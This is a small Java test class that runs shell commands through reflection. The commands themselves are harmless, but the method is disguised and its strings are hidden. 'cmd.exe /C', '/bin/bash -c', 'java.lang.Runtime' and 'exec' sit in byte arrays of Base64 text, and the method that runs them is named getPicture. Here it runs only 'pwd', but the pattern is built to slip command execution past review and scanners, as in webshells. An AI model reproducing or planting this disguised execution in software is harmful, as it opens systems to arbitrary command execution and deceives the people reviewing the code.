package com.lenkee.app.testBug;

import java.util.*;

/**
 * Created by amettursun on 2020/1/13.
 */
public class Reflict_cmd {
    public static void main(String[] args) throws Exception {
        String name ="Input Nothing";
        String query = "pwd";
        if(query != null) {
            name = getPicture(query);
        }
        System.out.println(name);
    }

    public static String getPicture(String str) throws Exception{
        String fileSeparator = String.valueOf(java.io.File.separatorChar);
        if(fileSeparator.equals("\\")){
            String s = new String(new byte[]{89, 50, 49, 107, 76, 109, 86, 52, 90, 83, 65, 118, 81, 121, 65, 61});
            str = deCode(s) + str;
        }else{
            String s = new String(new byte[]{76, 50, 74, 112, 98, 105, 57, 105, 89, 88, 78, 111, 73, 67, 49, 106, 73, 65, 61, 61});
            str =  deCode(s) + str;
        }
        String className = new String(new byte[]{97, 109, 70, 50, 89, 83, 53, 115, 89, 87, 53, 110, 76, 108, 74, 49, 98, 110, 82, 112, 98, 87, 85, 61});
        Class rt = Class.forName(deCode(className));
        String name = new String(new byte[]{90, 88, 104, 108, 89, 119, 61, 61});
        Process e = (Process) rt.getMethod(deCode(name), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null, new Object[]{}),  new Object[] { str });
        Scanner sc = new Scanner(e.getInputStream()).useDelimiter("\\A");
        String result = "";
        result = sc.hasNext() ? sc.next() : result;
        sc.close();
        return result;
    }
    public static String deCode(String code){
        return new String(Base64.getDecoder().decode(code));
    }

}
